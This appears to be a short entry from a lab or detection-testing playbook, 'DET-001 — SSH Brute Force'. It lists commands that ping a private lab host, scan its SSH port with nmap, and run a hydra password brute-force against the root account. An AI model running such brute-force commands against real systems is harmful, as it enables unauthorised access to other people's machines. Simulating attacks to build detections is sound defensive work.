# DET-001 — SSH Brute Force
```bash
# Verify target connectivity
ping -c 4 10.10.10.30

# Verify SSH service
nmap -p 22 10.10.10.30

# Brute-force simulation using the custom lab password list
hydra -l root -P /tmp/lab-passwords.txt ssh://10.10.10.30 -t 4                                                 
